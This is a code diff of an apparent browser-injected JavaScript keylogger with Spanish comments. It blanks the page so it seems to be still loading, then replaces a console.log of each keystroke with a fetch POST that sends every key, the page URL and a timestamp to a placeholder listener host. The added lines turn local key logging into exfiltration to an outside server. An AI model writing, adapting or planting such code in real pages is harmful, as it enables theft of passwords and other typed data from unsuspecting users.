@@ -1,3 +1,5 @@
+//Esto lo dejo así para cambiarlo por consola
+var https_listener_for_logging = 'https://listener.changeme'
 document.addEventListener('DOMContentLoaded', function () {
   // Borramos el contenido para que parezca que sigue cargando
   document.body.innerHTML = '';
@@ -16,7 +18,9 @@ document.addEventListener('DOMContentLoaded', function () {
     }).then(() => {
       //Finalmente agregamos el keylogger
       window.addEventListener("keydown", function (e) {
-        console.log(e.key);
+        fetch(https_listener_for_logging, {
+          method: "POST", body: { "key": e.key, "url": newUrl, "timestamp": Date.now() },
+        });
       });
       console.clear();
     })
